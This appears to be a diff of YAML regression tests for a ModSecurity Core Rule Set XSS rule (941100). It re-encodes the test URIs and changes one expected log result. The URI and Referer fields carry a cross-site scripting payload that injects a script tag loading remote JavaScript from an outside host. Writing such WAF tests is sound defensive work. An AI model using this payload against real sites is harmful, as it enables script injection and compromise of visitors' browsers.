@@ -6,7 +6,7 @@
     description: "Tests to trigger, or not trigger 941100"
   tests: 
     - 
-      test_title: 941100-1FN
+      test_title: 941100-1
       desc: Test as described in http://www.client9.com/article/five-interesting-injection-attacks/
       stages:
       - 
@@ -15,12 +15,12 @@
             dest_addr: 127.0.0.1
             method: GET
             port: 80
-            uri: '/demo/xss/xml/vuln.xml.php?input=<script xmlns="http://www.w3.org/1999/xhtml">setTimeout("top.frame2.location=\"javascript:(function () {var x = document.createElement(\\\"script\\\");x.src = \\\"//sdl.me/popup.js?//\\\";document.childNodes\[0\].appendChild(x);}());\"",1000)</script>&//'
+            uri: '/demo/xss/xml/vuln.xml.php?input=<script+xmlns="http://www.w3.org/1999/xhtml">setTimeout("top.frame2.location="javascript:(function+()+{var+x+=+document.createElement(\\"script\\");x.src+=+\\"//sdl.me/popup.js?//\\";document.childNodes\\[0\\].appendChild(x);}());"",1000)</script>&//'
             headers:
               User-Agent: ModSecurity CRS 3 Tests
               Host: localhost
           output:
-            no_log_contains: id "941100"
+            log_contains: id "941100"
     - 
       test_title: 941100-2
       desc: XSS in XML Test as described in http://www.client9.com/article/five-interesting-injection-attacks/
@@ -83,7 +83,7 @@
             uri: /
             headers:
               User-Agent: ModSecurity CRS 3 Tests
-              Referer: '/demo/xss/xml/vuln.xml.php?input=<script xmlns="http://www.w3.org/1999/xhtml">setTimeout("top.frame2.location=\"javascript:(function () {var x = document.createElement(\\\"script\\\");x.src = \\\"//sdl.me/popup.js?//\\\";document.childNodes\[0\].appendChild(x);}());\"",1000)</script>&//'
+              Referer: '/demo/xss/xml/vuln.xml.php?input=<script+xmlns="http://www.w3.org/1999/xhtml">setTimeout("top.frame2.location="javascript:(function+()+{var+x+=+document.createElement(\\"script\\");x.src+=+\\"//sdl.me/popup.js?//\\";document.childNodes\\[0\\].appendChild(x);}());"",1000)</script>&//'
               Host: localhost
           output:
-            no_log_contains: id "941100"                                        
+            no_log_contains: id "941100"
